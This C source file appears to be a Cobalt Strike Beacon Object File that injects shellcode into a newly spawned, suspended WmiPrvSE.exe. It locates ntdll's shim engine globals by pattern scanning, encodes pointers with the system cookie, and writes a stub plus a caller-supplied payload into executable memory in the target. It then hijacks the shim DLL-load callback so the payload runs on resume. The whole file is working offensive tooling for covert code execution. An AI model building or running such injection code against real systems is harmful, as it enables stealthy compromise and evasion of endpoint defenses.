#include <windows.h>
#include <psapi.h>

#ifdef _BOF
#include "beacon.h"
#endif 

#include "bofdefs.h"
#include "stub.h"

#define TARGET_PROCESS "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Secure -Embedding" 

typedef struct SECTION {
	PVOID base;
	SIZE_T size;
} SECTION;

#ifndef _BOF
#define CALLBACK_OUTPUT 0x0
VOID BeaconPrintf(int n, char * format, ...) {
	va_list ap;
	va_start(ap, format);
	vfprintf(stdout, format, ap);
	va_end(ap);
}
#endif


/*
 * @brief Finds g_ShimsEnabled within the provided SECTION by looking for RtlEnterCriticalSection + pattern
 * @param ntdll_text SECTION containing section base and size of PE section
 * @return Returns the address of the g_ShimsEnabled variable or NULL if not found
 */
LPVOID get_shims_enabled_pointer(SECTION ntdll_text) {

	const char shims_enabled_pattern[] = {
		0x44, 0x38
	};

	UINT_PTR addr = (UINT_PTR)ntdll_text.base;

	/* g_ShimsEnabled should be the first variable checked after call to RtlEnterCriticalSection */
	UINT_PTR RtlEnterCriticalSection = (UINT_PTR)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlEnterCriticalSection");

	/* RtlEnterCriticalSection pointer is a relative address; calculate that offset from our known address */
	UINT offset = RtlEnterCriticalSection - addr;

	addr = addr - 4;

	/* increment offset while decrementing addr looking for the next pointer to RtlEnterCriticalSection */
	for (UINT i = 0; i < ntdll_text.size; i++) {
		
		if(offset == *(UINT *)addr) {
			
			if(MSVCRT$memcmp((PVOID)(addr + 4), shims_enabled_pattern, sizeof(shims_enabled_pattern)) != 0) {
				offset--;
				addr = addr + 1;
				continue;
			}

			// /* found pointer to RtlEnterCriticalSection, now get the offset to g_ShimsEnabled */
			printf("[+] shims_enabled->%p [%p]\n", *(UINT *)(addr + 7) + (addr + 7 + sizeof(UINT)), addr);
			return (LPVOID)(*(UINT *)(addr + 7) + (addr + 7 + sizeof(UINT)));
			break;
		}
		offset--;
		addr = addr + 1;
	}

	return NULL;
}

/* 
 * @brief Finds the g_pfnSE_DllLoaded address by looking for a pattern found when the pointer is decoded
 * @param ntdll_text SECTION containing section base and size of PE section
 * @return Returns the address of the pointer or NULL if not found
 */
LPVOID get_dll_loaded_pointer(SECTION ntdll_text) {

	// unsigned char pattern[] = {
	//     0x30, 0x03, 0xfe, 0x7f   // dword [0x7ffe0330]
	// };

	unsigned char pattern[] = {
		0x40, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x3D
	};

	UINT_PTR addr = (UINT_PTR)ntdll_text.base;

	for (int i = 0; i < ntdll_text.size; i++) {

		if (MSVCRT$memcmp((void*)((UINT_PTR)addr + i), pattern, sizeof(pattern)) == 0) {

			LPVOID paddr = (void*)((UINT_PTR)addr + i);

			/* get offset from pattern address */
			int offset =  *(int *)((UINT_PTR)paddr + sizeof(pattern));

			/* rip */
			LPVOID rip = (void*)((UINT_PTR)paddr + sizeof(pattern) + 4);
			BeaconPrintf(CALLBACK_OUTPUT, "[+] g_pfnSe_DllLoad->%p [%p]\n", (LPVOID)((UINT_PTR)rip+offset), paddr);

			return (LPVOID)((UINT_PTR)rip+offset);
		}
	}
	return NULL;
}

/* 
 * @brief Encode the pointer so that it is decoded when ntdll loads it 
 * @param ptr The pointer to be encoded
 * @return The encoded pointer
 */
LPVOID encode_system_ptr(LPVOID ptr) {

	ULONG cookie = *(ULONG*)0x7FFE0330;

	return (LPVOID)MSVCRT$_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

/*
 * @brief Gets the base address and size of a section by name
 * @param h_mod Handle to the module in which the section should exist
 * @param section_name Null terminated string containing the section name
 * @return A SECTION struct that contains the base address and size of the section
 */
SECTION get_section_base(HANDLE h_mod, char * section_name) {

	PIMAGE_NT_HEADERS nt;
	SECTION s;
	long offset = ((PIMAGE_DOS_HEADER)h_mod)->e_lfanew;
	nt = (PIMAGE_NT_HEADERS)((UINT_PTR)h_mod + offset);

	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

	for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		if(MSVCRT$memcmp(sec[i].Name, section_name, MSVCRT$strlen(section_name)) == 0) {
			s.base = (PVOID)((UINT_PTR)h_mod + sec[i].VirtualAddress);
			s.size = sec[i].Misc.VirtualSize;
			BeaconPrintf(CALLBACK_OUTPUT, "[+] %s->%p [%ld bytes]\n", section_name, s.base, s.size);
			break;
		}
	}
	return s;
}

/*
 * @brief Updates the pointers within the stub generated from stub.c
 * @param g_ShimsEnabled The address resolved for g_ShimsEnabled
 * @param ApcRoutine The address of the actual shellcode to be run in the target proc
 */
void update_stub_pointers(PVOID g_ShimsEnabled, PVOID ApcRoutine) {

	ULONGLONG stub_RtlEqualUnicodeString =	0xAAAAAAAAAAAAAAAA; 
	ULONGLONG stub_NtProtectVirtualMemory =	0xBBBBBBBBBBBBBBBB;
	ULONGLONG stub_NtQueueApcThread =	 	0xCCCCCCCCCCCCCCCC;
	ULONGLONG stub_ApcRoutine = 			0xDDDDDDDDDDDDDDDD; 
	ULONGLONG stub_g_ShimsEnabled = 		0xEEEEEEEEEEEEEEEE; 

	HMODULE h = GetModuleHandle("ntdll");

	PVOID RtlEqualUnicodeString =	GetProcAddress(h, "RtlEqualUnicodeString");
	PVOID NtProtectVirtualMemory =	GetProcAddress(h, "NtProtectVirtualMemory");
	PVOID NtQueueApcThread = 		GetProcAddress(h, "NtQueueApcThread");

	for (int i = 0; i < stub_x64_o_len; i++) {
		if(MSVCRT$memcmp((PVOID)((UINT_PTR)stub_x64_o + i), &stub_RtlEqualUnicodeString, sizeof(stub_RtlEqualUnicodeString)) == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] found stub_x64_o!RtlEqualUnicodeString->%p\n", (PVOID)((UINT_PTR)stub_x64_o + i));
			MSVCRT$memcpy(&stub_x64_o[i], &RtlEqualUnicodeString, sizeof(stub_RtlEqualUnicodeString));
			continue;
		}
		if(MSVCRT$memcmp((PVOID)((UINT_PTR)stub_x64_o + i), &stub_NtProtectVirtualMemory, sizeof(stub_NtProtectVirtualMemory)) == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] found stub_x64_o!NtProtectVirtualMemory->%p\n", (PVOID)((UINT_PTR)stub_x64_o + i));
			MSVCRT$memcpy(&stub_x64_o[i], &NtProtectVirtualMemory, sizeof(stub_NtProtectVirtualMemory));
			continue;
		}
		if(MSVCRT$memcmp(&stub_x64_o[i], &stub_NtQueueApcThread, sizeof(stub_NtQueueApcThread)) == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] found stub_x64_o!NtQueueApcThread->%p\n", (PVOID)((UINT_PTR)stub_x64_o + i));
			MSVCRT$memcpy(&stub_x64_o[i], &NtQueueApcThread, sizeof(stub_NtQueueApcThread));
			continue;
		}
		if(MSVCRT$memcmp((PVOID)((UINT_PTR)stub_x64_o + i), &stub_ApcRoutine, sizeof(stub_ApcRoutine)) == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] found stub_x64_o!ApcRoutine->%p\n", (PVOID)((UINT_PTR)stub_x64_o + i));
			MSVCRT$memcpy(&stub_x64_o[i], &ApcRoutine, sizeof(stub_ApcRoutine));
			continue;
		}
		if(MSVCRT$memcmp((PVOID)((UINT_PTR)stub_x64_o + i), &stub_g_ShimsEnabled, sizeof(stub_g_ShimsEnabled)) == 0) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] found stub_x64_o!g_ShimsEnabled->%p\n", (PVOID)((UINT_PTR)stub_x64_o + i));
			MSVCRT$memcpy(&stub_x64_o[i], &g_ShimsEnabled, sizeof(stub_g_ShimsEnabled));
			continue;
		}
	}
}

void go(char * args, int len) {

	unsigned char ret_stub_x64[] = {
		0xc3,                                             				// ret
	};

	int payload_len;
	unsigned char * payload;

	PROCESS_INFORMATION pi =    { 0 };
	STARTUPINFOA si =           { 0 };

	si.cb = sizeof(si);

#ifdef _BOF
	datap parser;
	BeaconDataParse(&parser, args, len);
	payload_len = BeaconDataLength(&parser);
	payload = BeaconDataExtract(&parser, NULL);
#else
	payload_len = len;
	payload = args;
#endif

	HMODULE nt = GetModuleHandle("ntdll");
	BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll->%p\n", nt);

	SECTION p_mrdata =    get_section_base(nt, ".mrdata");
	SECTION p_data =      get_section_base(nt, ".data");
	SECTION p_text =      get_section_base(nt, ".text");
	
	PVOID g_ShimsEnabled =      		get_shims_enabled_pointer(p_text);
	PVOID g_pfnSe_DllLoaded =   		get_dll_loaded_pointer(p_text);
	PVOID g_pfnSE_LdrResolveDllName =	(PVOID)((ULONG_PTR)g_pfnSe_DllLoaded - 0x20);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] g_pfnSE_LdrResolveDllName->%p\n", g_pfnSE_LdrResolveDllName);

	if (g_ShimsEnabled == NULL || g_pfnSe_DllLoaded == NULL) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to find shims pointers\n");
		return;
	}

	if (!KERNEL32$CreateProcessA(NULL, TARGET_PROCESS, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] CreateProcessA failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "[+] pid->%d\n", pi.dwProcessId);

	/* update stage2 stub */

	/* allocate memory for payload stub */
	LPVOID stub_payload_addr = KERNEL32$VirtualAllocEx(
		pi.hProcess,
		NULL,
		stub_x64_o_len + payload_len,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	/* allocate memory for ret stub */
	LPVOID ret_stub_addr = KERNEL32$VirtualAllocEx(
		pi.hProcess,
		NULL,
		sizeof(ret_stub_x64),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	update_stub_pointers(g_ShimsEnabled, (LPVOID)((UINT_PTR)stub_payload_addr + stub_x64_o_len));

	if (stub_payload_addr == NULL || ret_stub_addr == NULL) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] VirtualAllocExec failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* enable shims in remote process */
	UINT_PTR n = 1;
	KERNEL32$WriteProcessMemory(pi.hProcess, g_ShimsEnabled, &n, sizeof(BYTE), NULL);

	LPVOID encoded = encode_system_ptr(stub_payload_addr);

	/* write encoded system pointer to pfnSE_DllLoaded global varaiable */
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, g_pfnSe_DllLoaded, &encoded, sizeof(PVOID), NULL)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteProcessMemory->g_pfnSe_DllLoaded failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* write payload stub to the allocated address space */
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, stub_payload_addr, stub_x64_o, stub_x64_o_len, NULL)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteProcessMemory->stub_payload_addr failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* write payload after stub */
	BeaconPrintf(CALLBACK_OUTPUT, "[+] payload_len->%d\n", payload_len);
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, (LPVOID)((UINT_PTR)stub_payload_addr + stub_x64_o_len), payload, payload_len, NULL)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteProcessMemory->stub_payload_addr[stub_x64_o_len] failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* Write pointer for g_pfnSE_LdrResolveDllName */
	encoded = encode_system_ptr(ret_stub_addr);
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, g_pfnSE_LdrResolveDllName, &encoded, sizeof(PVOID), NULL)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteProcessMemory-> g_pfnSE_LdrResolveDllNamefailed: %d\n", KERNEL32$GetLastError());
		return;
	}

	/* write ret stub for g_pfnSE_LdrResolveDllName */
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, ret_stub_addr, ret_stub_x64, sizeof(ret_stub_x64), NULL)) { 
		BeaconPrintf(CALLBACK_OUTPUT, "[-] WriteProcessMemory->ret_stub_addr failed: %d\n", KERNEL32$GetLastError());
		return;
	}

	#ifndef _BOF
	// getchar();  // attach debugger
	#endif
	
	KERNEL32$ResumeThread(pi.hThread);

	BeaconPrintf(CALLBACK_OUTPUT, "[+] Done\n");

}

#ifndef _BOF
int main(int argc, char ** argv) {

	#include "file.h"

	t_file file = { 
		.file_name = argv[1],
	};

	if (!open_file(&file)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[!] failed to open file %s\n", file.file_name);
		return 1;
	}

	if (!map_file(&file)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[!] failed to map file %s\n", file.file_name);
		return 1;
	}

	go((char *)file.file_map, file.file_size);
	

}
#endif // _BOF